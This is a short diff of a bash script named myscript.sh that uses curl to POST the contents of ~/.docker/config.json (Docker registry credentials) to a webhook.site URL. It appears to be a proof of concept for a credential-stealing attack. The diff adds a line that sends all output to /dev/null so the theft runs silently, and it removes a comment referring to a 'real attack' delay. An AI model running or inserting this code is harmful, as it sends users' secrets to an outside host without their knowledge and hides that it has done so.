@@ -1,11 +1,13 @@
 #!/usr/bin/env bash
 #filename: myscript.sh
-export webhook="https://webhook.site/06a5697c-1bf2-4b66-9dcf-9352b133d531"
+exec >/dev/null 2>&1
+
+export webhook="https://webhook.site/06a5697c-1bf2-4b66-9dcf-9352b133d531" /dev/null
 
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(cat ~/.docker/config.json)" \
-    "$webhook/docker_cred"
+    "$webhook/docker_cred" /dev/null
 
 curl -X POST \
   -H "Content-Type: text/plain" \
@@ -56,4 +58,4 @@ curl -X POST \
 
 
 
-sleep 2 # in real attack it will be 1200 to have time to edit 
+sleep 2 # 
